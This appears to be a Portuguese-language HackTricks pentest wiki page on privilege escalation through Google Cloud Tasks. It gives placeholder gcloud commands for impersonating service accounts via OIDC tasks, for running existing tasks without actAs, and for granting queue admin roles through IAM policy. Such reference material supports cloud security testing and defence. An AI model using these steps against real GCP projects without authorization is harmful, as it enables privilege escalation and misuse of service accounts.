# GCP - Cloud Tasks Escalada de privilégios

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Tasks

### `cloudtasks.tasks.create`, `iam.serviceAccounts.actAs`

Um atacante com essas permissões pode **impersonate outras service accounts** ao criar tasks que são executadas com a identidade da service account especificada. Isso permite enviar **requisições HTTP autenticadas para serviços Cloud Run ou Cloud Functions protegidos por IAM**.

<details><summary>Create Cloud Task with service account impersonation</summary>
```bash
gcloud tasks create-http-task \
task-$(date '+%Y%m%d%H%M%S') \
--location us-central1 \
--queue <queue_name> \
--url 'https://<service_name>.us-central1.run.app' \
--method POST \
--header 'X-Hello: world' \
--body-content '{"hello":"world"}' \
--oidc-service-account-email <account>@<project_id>.iam.gserviceaccount.com
```
</details>

### `cloudtasks.tasks.run`, `cloudtasks.tasks.list`

Um attacker com essas permissões pode **executar tarefas agendadas existentes** sem precisar de permissões na conta de serviço associada à tarefa. Isso permite executar tarefas que foram previamente criadas com contas de serviço com privilégios mais altos.

<details><summary>Executar Cloud Task existente sem permissão actAs</summary>
```bash
gcloud tasks run projects/<project_id>/locations/us-central1/queues/<queue_name>/tasks/<task_id>
```
</details>

O principal que executa este comando **não precisa da permissão `iam.serviceAccounts.actAs`** na conta de serviço da tarefa. No entanto, isso apenas permite executar tarefas existentes — não concede a capacidade de criar ou modificar tarefas.

### `cloudtasks.queues.setIamPolicy`

Um atacante com essa permissão pode **conceder a si mesmo ou a outros principals papéis do Cloud Tasks** em filas específicas, potencialmente escalando para `roles/cloudtasks.admin`, que inclui a capacidade de criar e executar tarefas.

<details><summary>Conceder papel de administrador do Cloud Tasks na fila</summary>
```bash
gcloud tasks queues add-iam-policy-binding \
<queue_name> \
--location us-central1 \
--member serviceAccount:<account>@<project_id>.iam.gserviceaccount.com \
--role roles/cloudtasks.admin
```
</details>

Isso permite que o atacante conceda permissões de administrador completas do Cloud Tasks na fila a qualquer service account que ele controle.

## Referências

- [Google Cloud Tasks Documentation](https://cloud.google.com/tasks/docs)

{{#include ../../../banners/hacktricks-training.md}}
